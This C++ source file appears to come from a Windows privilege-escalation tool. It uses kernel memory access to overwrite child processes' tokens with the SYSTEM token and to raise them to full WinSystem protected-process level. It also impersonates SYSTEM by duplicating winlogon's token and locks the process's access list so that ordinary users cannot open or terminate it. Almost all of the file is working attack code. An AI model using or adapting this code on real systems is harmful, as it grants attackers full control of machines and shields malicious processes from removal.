#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <aclapi.h>
#include "syscalls.h"
#include "symbols.h"
#include "physmem.h"
#include "window.h"
#include "protect.h"

#pragma comment(lib, "advapi32.lib")

// Every child of ours whose image name matches, so the console host can be
// brought along with us.
static void ForEachChildProcess(const wchar_t* imageName,
                                void (*fn)(DWORD pid, void* ctx), void* ctx) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    DWORD parent = GetCurrentProcessId();
    PROCESSENTRY32W entry = {};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (entry.th32ParentProcessID == parent &&
                _wcsicmp(entry.szExeFile, imageName) == 0)
                fn(entry.th32ProcessID, ctx);
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
}

struct ElevateCtx {
    ULONG64 systemCr3;
    KernelOffsets* offsets;
    ULONG64 systemToken;
    bool any;
};

// One EPROCESS lookup per child, then both writes: the child ends up with the
// same primary token and the same PPL level as we do.
static void ElevateOneChild(DWORD pid, void* rawCtx) {
    ElevateCtx* ctx = (ElevateCtx*)rawCtx;
    ULONG64 eprocVA = 0;
    if (!WindowFindEprocessByPid(ctx->systemCr3, ctx->offsets, pid, false, &eprocVA)) {
        printf("[-] Could not find the EPROCESS for child PID %u\n", pid);
        return;
    }

    char label[64] = {};
    wsprintfA(label, "PID %u", pid);

    bool ok = false;
    if (ctx->systemToken)
        ok |= WindowSetProcessToken(ctx->systemCr3, ctx->offsets, eprocVA, ctx->systemToken, label);
    ok |= WindowSetProcessPpl(ctx->systemCr3, ctx->offsets, eprocVA, PPL_FULL_WINSYSTEM);
    if (ok) ctx->any = true;
}

bool MatchChildToSystem(ULONG64 systemCr3, KernelOffsets* offsets, const wchar_t* imageName) {
    ElevateCtx ctx = { systemCr3, offsets, 0, false };
    ctx.systemToken = WindowSystemToken(systemCr3, offsets);

    ForEachChildProcess(imageName, ElevateOneChild, &ctx);
    return ctx.any;
}

// Print the raw Protection byte for every matching child. The byte is the
// ground truth: how a tool renders it is that tool's business, and a display
// string like "Unknown (Lsa)" is easy to misattribute to the wrong process.
struct ProtCtx {
    ULONG64 systemCr3;
    KernelOffsets* offsets;
};

static void ReportOneChildProtection(DWORD pid, void* rawCtx) {
    ProtCtx* ctx = (ProtCtx*)rawCtx;
    ULONG64 eprocVA = 0;
    if (!WindowFindEprocessByPid(ctx->systemCr3, ctx->offsets, pid, false, &eprocVA)) {
        printf("    child PID %u: EPROCESS not found\n", pid);
        return;
    }
    printf("    child PID %u: Protection 0x%02X\n", pid,
           WindowGetProcessProtection(ctx->systemCr3, ctx->offsets, eprocVA));
}

void ReportChildProtection(ULONG64 systemCr3, KernelOffsets* offsets, const wchar_t* imageName) {
    ProtCtx ctx = { systemCr3, offsets };
    ForEachChildProcess(imageName, ReportOneChildProtection, &ctx);
}

static DWORD FindWinlogonPid() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W entry = {};
    entry.dwSize = sizeof(entry);
    if (!Process32FirstW(snapshot, &entry)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (_wcsicmp(entry.szExeFile, L"winlogon.exe") == 0) {
            CloseHandle(snapshot);
            return entry.th32ProcessID;
        }
    } while (Process32NextW(snapshot, &entry));

    CloseHandle(snapshot);
    return 0;
}

// Impersonate SYSTEM on this thread. Note this changes only the thread's
// effective token - the process identity is fixed separately by swapping
// EPROCESS::Token in window.cpp.
bool ImpersonateSystem() {
    DWORD pid = FindWinlogonPid();
    if (!pid) return false;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return false;

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hImpToken = NULL;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
        SecurityImpersonation, TokenImpersonation, &hImpToken)) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    BOOL result = SetThreadToken(NULL, hImpToken);
    CloseHandle(hImpToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    if (result) printf("[+] SYSTEM token acquired\n");
    return result;
}

// Lock the process object down: a DENY for Everyone plus a GRANT for SYSTEM, so
// the process can only be opened by a sufficiently privileged one. Applied last,
// since it also denies *us* write access to our own process object.
bool LockProcessDACL() {
    SID_IDENTIFIER_AUTHORITY worldAuth = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID pEveryone = NULL, pSystem = NULL;

    if (!AllocateAndInitializeSid(&worldAuth, 1, SECURITY_WORLD_RID, 0,0,0,0,0,0,0, &pEveryone))
        return false;
    if (!AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0,0,0,0,0,0,0, &pSystem)) {
        FreeSid(pEveryone);
        return false;
    }

    EXPLICIT_ACCESSW ea[2] = {};
    ea[0].grfAccessPermissions = PROCESS_ALL_ACCESS;
    ea[0].grfAccessMode = DENY_ACCESS;
    ea[0].grfInheritance = NO_INHERITANCE;
    BuildTrusteeWithSidW(&ea[0].Trustee, pEveryone);

    ea[1].grfAccessPermissions = PROCESS_ALL_ACCESS;
    ea[1].grfAccessMode = GRANT_ACCESS;
    ea[1].grfInheritance = NO_INHERITANCE;
    BuildTrusteeWithSidW(&ea[1].Trustee, pSystem);

    PACL pAcl = NULL;
    if (SetEntriesInAclW(2, ea, NULL, &pAcl) != ERROR_SUCCESS) {
        FreeSid(pEveryone); FreeSid(pSystem);
        return false;
    }

    PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
    InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(pSD, TRUE, pAcl, FALSE);

    BOOL result = SetKernelObjectSecurity(GetCurrentProcess(), DACL_SECURITY_INFORMATION, pSD);

    LocalFree(pSD);
    LocalFree(pAcl);
    FreeSid(pEveryone);
    FreeSid(pSystem);

    if (result) printf("[+] DACL locked\n");
    return result;
}
